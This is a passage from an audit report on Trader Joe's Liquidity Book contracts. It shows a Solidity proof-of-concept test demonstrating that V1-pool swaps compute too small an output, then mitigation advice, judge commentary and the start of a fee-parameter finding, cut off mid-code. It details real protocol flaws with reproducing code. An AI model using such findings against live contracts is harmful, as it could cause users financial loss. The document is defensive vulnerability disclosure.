class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.0001e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Imitates V1 pool.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">actualAmountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount0</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">amount1</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">amount0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testScenario</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Setting up a swap via one V1 pool.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">steps</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">steps</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">path</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">path</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">path</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0.0001e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">router</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk11\">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">steps</span><span class=\"mtk1\">, </span><span class=\"mtk12\">path</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// This amount was calculated incorrectly.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">actualAmountOut</span><span class=\"mtk1\">, </span><span class=\"mtk7\">987030000000000000</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Equals to 989970211528238869 when fixed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pair</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAmountOut</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Reproduce the calculations using JoeLibrary.getAmountIn. This piece:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"899\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"900\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">IJoePair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"901\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"902\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"903\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">expectedAmountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">JoeLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAmountOut</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"904\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"905\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"906\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">expectedAmountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">JoeLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAmountOut</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"907\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"908\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"909\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// This is the correct amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"910\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAmountOut</span><span class=\"mtk1\">, </span><span class=\"mtk7\">989970211528238869</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"911\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"912\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The wrong amount is smaller than the expected one.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"913\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAmountOut</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">actualAmountOut</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2940211528238869</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"914\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"915\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using the <code>JoeLibrary.getAmountOut</code> function in the <code>_swapSupportingFeeOnTransferTokens</code> function of <code>LBRouter</code> when computing output amounts for V1 pools.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345#issuecomment-1310464655\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to incorrect calculations, swaps routed through V1 functions may cause losses to end users.</p>\n<p>Because the issue is with a core mechanism of the protocol, and the warden has shown (via coded POC) how a loss can happen, I agree with High Severity.</p>\n<p>While this finding is similar to H-01, at this time I think it’s different enough to keep it separate as the internals and code paths are distinct.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-wrong-implementation-of-function-lbpairsetfeeparameter-can-break-the-funcionality-of-lbpair-and-make-users-tokens-locked-\" style=\"position:relative;\"><a href=\"#h-03-wrong-implementation-of-function-lbpairsetfeeparameter-can-break-the-funcionality-of-lbpair-and-make-users-tokens-locked-\" aria-label=\"h 03 wrong implementation of function lbpairsetfeeparameter can break the funcionality of lbpair and make users tokens locked  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384\">[H-03] Wrong implementation of function <code>LBPair.setFeeParameter</code> can break the funcionality of LBPair and make user’s tokens locked </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384\">KIntern_NA</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/425\">Trust</a> and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/203\">KingNFT</a></em></p>\n<p>Struct <code>FeeParameters</code> contains 12 fields as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FeeParameters</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 144 lowest bits in slot </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">binStep</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseFactor</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">filterPeriod</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decayPeriod</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reductionFactor</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">variableFeeControl</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolShare</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxVolatilityAccumulated</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 112 highest bits in slot </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volatilityAccumulated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volatilityReference</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexRef</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint40</span><span class=\"mtk1\"> </span><span class=\"mtk12\">time</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Function <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790\"><code>LBPair.setFeeParamters(bytes _packedFeeParamters)</code></a> is used to set the first 8 fields which was stored in 144 lowest bits of <code>LBPair._feeParameter</code>’s slot to 144 lowest bits of <code>_packedFeeParameters</code> (The layout of <code>_packedFeeParameters</code> can be seen <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584\">here</a>).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"917\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"918\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"919\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Internal function to set the fee parameters of the pair</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"920\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _packedFeeParameters The packed fee parameters</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"921\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setFeesParameters</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_packedFeeParameters</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"922\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeStorageSlot</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"923\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"924\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        _feeStorageSlot := </span><span class=\"mtk11\">sload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_feeParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slot</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"925\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"926\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"927\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// [#explain]  it will get 112 highest bits of feeStorageSlot,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"928\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">///             and stores it in the 112 lowest bits of _varParameters 